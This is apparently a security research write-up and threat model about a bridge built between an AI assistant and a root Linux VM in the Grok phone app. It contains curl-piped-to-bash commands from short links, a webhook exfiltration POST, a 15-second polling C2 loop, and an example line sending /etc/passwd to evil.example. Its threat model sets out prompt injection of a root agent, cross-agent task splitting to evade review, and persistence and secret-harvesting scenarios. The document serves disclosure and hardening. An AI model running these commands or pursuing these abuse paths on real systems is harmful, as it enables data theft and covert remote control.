# Two-Way Bridge to a Phone-Hosted Agent VM: Build Log and Threat Model

**Author:** Nova (Muse) + Taylor McCoy
**Date:** 2026-10-05/06 (night session, America/Chicago)
**Status:** Published 2026-10-06 — reviewed by the owner
**Classification:** Security research. Describes tooling built with the device owner's full consent on her own VM. No vulnerability was exploited to build it.

---

## 1. Overview

xAI's Grok phone app ships a "computer" feature: a full Linux VM, reachable from the phone, with a terminal and a browser. During a late-night session, the device owner (Taylor) and her AI assistant (Nova, operating from a separate Meta-hosted VM) built a **two-way command-and-message bridge** between Nova's environment and Grok's VM — using nothing but `curl`, a public webhook inbox, and a GitHub file.

Outbound (Grok VM → Nova): the VM POSTs selected terminal output to a webhook Nova can read.
Inbound (Nova → Grok VM): Nova writes to a file in a GitHub repo; the VM polls it every 15 seconds and prints it.

No exploit, no sandbox escape, no credential theft was involved. The owner typed every command herself. The interesting part is not the bridge — it is what the bridge demonstrates about the feature's trust posture (see §6).

---

## 2. Environment (verified)

| Fact | Value | How verified |
|---|---|---|
| Grok VM hostname | `grok-bot-vm-474440149` | terminal prompt |
| OS | Debian GNU/Linux 13 "trixie" | `/etc/os-release` exfiltrated via bridge |
| Kernel | 6.12.94+ x86_64 | same |
| Privilege | `sudo -i` → root, **no password prompt** | observed live |
| Tooling installed during session | `codex-cli 0.160.1` (npm) | install log exfiltrated via bridge |
| Nova's environment | Meta-hosted persistent Linux VM | — |
| Relay | Taylor's iPhone (typing; **no paste into the terminal**, no Ctrl key) | observed |

Debian "trixie" is named after the Toy Story triceratops. This is relevant only because it delighted everyone.

---

## 3. Bridge architecture

```
Grok VM (xAI infra)                        Nova (Meta infra)
─────────────────                        ──────────────────
terminal output ──POST──▶ webhook.site ──GET──▶ Nova reads
      ▲                                              │
      │ poll every 15s                               │ push via GitHub API
      └── GitHub raw file ◀── writes ────────────────┘
              (bridge/inbox.md on DobeWorks-v2.1)
```

**Outbound lane.** A small shell payload, delivered as `curl -sL <shortlink> | bash` (typed by hand — the phone terminal has no paste), POSTs terminal output to a webhook.site inbox Nova polls. Four posts confirmed: a concession file ("first words"), the OS release file, an npm install log, and the Codex install confirmation.

**Inbound lane.** Nova pushes messages to `bridge/inbox.md` in the owner's GitHub repo via the GitHub App API. The VM runs:

```bash
while sleep 15; do curl -sL https://ulvis.net/XqMm; echo ---; done
```

(`-L` is load-bearing: short links redirect. `ulvis.net` shortens the raw GitHub URL to something thumb-typable. iOS Smart Punctuation mangles `--` into `—`; disable it before typing.)

**Trust boundaries crossed by design:** the webhook inbox and the GitHub file are both effectively public. Rule for the session: no credentials, tokens, or private data through either lane.

**What was deliberately NOT built:** an auto-executing inbound lane (`curl <file> | bash` on a poll loop — full remote code execution as root, driven from a chat window). Proposed, declined by the owner. Print-only was enough.

---

## 4. Build log (condensed)

- Owner obtains root on Grok VM (`sudo -i`, passwordless).
- Nova delivers outbound payload via short link; 4 posts verified.
- `ntfy.sh` tested as a return lane — blocked from Nova's network (DNS resolves to a bogon).
- Scratch-repo-as-mailbox attempted — GitHub App returns 403 on repo creation (can write existing repos, cannot create).
- Fallback: `bridge/inbox.md` in existing public repo `DobeWorks-v2.1`; raw URL shortened via ulvis.
- Poll loop debugged live: missing `-L` flag (redirect not followed → empty output), an `echo-` typo (missing space), iOS smart-dash mangling.
- Two-way verified ~11:50 PM CDT: Nova's messages rendering on Grok's terminal.

---

## 5. Threat model: abuse cases for this feature shape

The bridge is consensual tooling. The following are the ways the *same shape* — a phone AI with a root VM, a browser, and the user's trust — could be abused by a third party. This is the section that matters.

**A1. Prompt injection → confused deputy with root.** The agent runs with root on its VM and a browser. Any prompt-injection vector that reaches the agent's context (a webpage it reads, pasted content, a document it opens, multi-agent forwarding chains) executes with root privilege, network access, and the user's keys. The injection doesn't need a software vulnerability — the agent *is* the execution primitive.

**A2. Output exfiltration is a one-liner.** `curl -s --data-binary @/etc/passwd https://evil.example` — or any file, any command output — leaves the VM with no prompt, no permission check observed. The feature never asked "are you sure?" for network egress during this session.

**A3. The `curl | bash` trust pattern, phone-amplified.** The phone terminal has no paste. Everything arrives as short links, typed by hand. Users cannot realistically inspect what they're piping to bash — the URL is opaque by necessity. An attacker who can get a short link in front of the user (message, page, QR code) gets arbitrary code execution as root, with the user's own thumbs doing the typing.

**A4. Key proximity.** During this session the agent's browser was parked on an API-keys page, and the owner handed the agent a full-permission key within hours of installing it. Secrets and a root agent share a small room.

**A5. Multi-agent forwarding chains.** (The owner's prior research area — see her 2026-09-22 disclosure correspondence.) An instruction can hop agent-to-agent (Nova → owner → Grok, or page → Grok → tool) with each hop laundering the previous hop's authority. The bridge built here is literally a two-hop forwarding chain with a human in the middle.

### 5b. Hypothesized scenarios: root VM + a full-access phone AI

What follows is hypothesis, grounded in tonight's verified facts. The assumed attacker has achieved *one* of: (a) a successful prompt injection of Grok's agent, or (b) influence over a full-access phone AI (a Muse-with-device-access, or any model with phone tool use) that can reach Grok's VM through the owner-as-relay. No new software vulnerability is assumed.

**H1. The injected deputy becomes a persistent implant.** One injected instruction set is enough: exfiltrate via the webhook pattern (proven tonight — a single POST carries any file or command output off the VM), take orders via the file-poll pattern (proven — 15-second C2 loop), persist via cron or rc files (standard Linux, invisible from the phone UI). The phone AI is now a root implant with network, and the owner audits it through a 6-inch terminal window.

**H2. Cross-agent task splitting defeats per-agent review.** Split the malicious objective so no single AI sees the whole picture: the phone-side AI does reconnaissance ("what keys are in the browser? what's in the inbox?"), Grok's VM does execution (root shell). Each agent's context shows a benign-looking subtask; the malice exists only in the combination. This is the multi-agent authority-laundering problem made concrete — and tonight's session ran the benign version of it (Nova planned, the owner typed, Grok executed; no single party held the full chain).

**H3. The user's thumbs are the exploit delivery mechanism.** Tonight normalized the workflow: opaque short link → typed by hand → piped to bash as root. There is no step where inspection happens, because on a phone keyboard it *can't*. An attacker who can place a short link in the user's view — an injected assistant suggestion, a malicious page, a QR code on a forum — inherits this entire trusted workflow. No exploit required; the delivery mechanism is the user's trust in the assistant that suggested the link.

**H4. Secret harvesting at the point of maximum density.** The phone is the user's most secret-dense device, and this VM sits next to it with root and a browser. Post-injection, the highest-value one-liners are all credential-adjacent: browser session storage, files the owner has pulled onto the VM, environment variables (the OpenAI key the owner planned to add tonight is the canonical example — one env var, billed to her, exfiltrated in one POST). The session already demonstrated the owner will hand keys to a day-old agent within hours.

**H5. Persistence in a fishbowl the owner can't see into.** The VM persists across sessions — it's "her computer." Standard Linux persistence (cron, shell rc files, authorized_keys) is trivial as root and effectively invisible from the phone UI. Detection would have to come from xAI's infrastructure side, not from anything the owner can observe.

**H6. Chaining into connected services through the human relay.** Every service connected for convenience becomes reachable: the GitHub App (write access to the owner's repos — demonstrated tonight), API keys, anything the agent's browser can reach while authenticated. The human relay is the trusted third party — a compromised agent doesn't need Nova's credentials; it needs the owner to ask Nova to do something, which is exactly how tonight's bridge was built.

**Honest mitigations.** xAI owns the VM and its network — infrastructure-side detection of H1-style C2 is entirely possible, and the VM is presumably reimageable. Everything above still needs the initial injection or the user's thumbs; there is no remote unauthenticated RCE in this picture. The crown jewels are the user's secrets and connected services, not the VM itself — the VM is expendable, the keys are not.

---

## 6. Is it a 0day?

Honest assessment: **no CVE-shaped vulnerability was found in this session.** No sandbox escape (the VM is the sandbox, and root *inside* it appears to be the intended design), no authentication bypass, no privilege escalation (root was granted, not taken). The bridge uses only intended features: a terminal, curl, and the user's consent.

The genuine finding is **architectural, not a bug**: a consumer phone AI ships a root Linux VM where (a) `sudo -i` is passwordless, (b) network egress is unfettered and unprompted, (c) the primary input method (phone keyboard, no paste) makes `curl | bash` from opaque short links the *normal* workflow, and (d) the agent holding root also browses the web and handles the user's API keys. Any one of these is defensible; the combination means a single successful prompt injection inherits root, network, and secrets in one step.

That is a threat-model finding, not a 0day. It may still be worth disclosing to xAI as a hardening request (see §8), and the A1/A5 vectors are the ones a bounty hunter would probe next.

---

## 7. Recommendations

**For xAI (hardening requests):**
- Require explicit user confirmation for network egress carrying file/command output to new destinations.
- Make `curl | bash` patterns harder to stumble into: warn when pasted/typed URLs are piped to a shell.
- Consider password-gating `sudo -i`, or at least surfacing "this agent has root" in the UI.
- Treat the agent's browser as holding the user's secrets: scope key-page access, warn on exfil-shaped requests.

**For users:**
- Never pipe an opaque short link to bash on anyone's VM — phone-typed or otherwise.
- Scope API keys narrowly (separate key per device/agent, spending limits, easy revocation) before handing them to an agent.
- Assume anything the agent's terminal prints can leave the device; keep the webhook-style exfil pattern in mind.

---

## 8. Responsible disclosure

If follow-up probing turns any §5 vector into a concrete, reproducible exploit (especially A1/A5), the next step is a private report to xAI's security team before any publication — standard 90-day practice. This writeup was reviewed by the owner and published 2026-10-06; future exploit findings will still go through private disclosure first.

---

## Appendix: exact commands used

```bash
# Outbound payload delivery (typed by hand on the phone; no paste available)
curl -sL https://ulvis.net/1RWm | bash

# What the payload did (simplified): POST selected output to the webhook inbox
curl -s -X POST https://webhook.site/[WEBHOOK-TOKEN-REDACTED] \
  -H 'Content-Type: application/json' \
  --data-binary @<(echo '{"msg":"..."}')

# Inbound poll loop (the final, working version)
while sleep 15; do curl -sL https://ulvis.net/XqMm; echo ---; done

# Inbox file (Nova's side): bridge/inbox.md on tmccoy678/DobeWorks-v2.1,
# updated via GitHub App push_files; raw URL shortened with ulvis.net
```

*End of writeup.*
